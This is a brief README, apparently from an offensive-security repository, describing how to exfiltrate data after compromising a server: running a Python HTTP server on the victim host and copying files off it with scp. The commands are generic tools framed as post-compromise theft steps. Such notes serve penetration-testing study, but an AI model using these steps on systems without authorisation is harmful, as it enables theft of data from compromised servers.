# Easy Data Exfiltrate

This repository contains the techniques for data exfiltration after compromising a server. 

## Using Python Server
The easiest method will be to start a Python HTTP Server on the target server, and downloading
the required data in personal system through web browser. 

In Python 3.x the following command can be used to start a python server:

```bash
python3 -m http.server 8000
```

In Python 2.x the following command can be used to start a python server. 

```bash
python -m SimpleHTTPServer 8000
```

But mostly, you will not find python installed on the compromised system, so you can try the next technique. 

## Through SSH

If the SSH port is open and you have the SSH credentials, then the data can be transferred through ssh easily using the technique given below:

Run This command on your own system

```bash
scp user@ServerIP:/home/location/of/the/data.zip Location/on/MySystem.zip
```
> [!NOTE]
> This will ask for the SSH Password if you are not in the authorized_keys.


The above command will simply copy the file/data from remote server just like the `cp` command copies files in your own system. 



